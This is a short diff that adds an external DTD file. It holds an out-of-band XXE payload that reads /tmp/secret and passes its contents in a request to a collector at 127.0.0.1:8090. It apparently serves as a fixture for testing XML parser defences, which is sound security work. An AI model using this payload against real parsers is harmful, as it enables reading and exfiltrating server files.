@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///tmp/secret">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8090?collect=%file;'>"> %all;
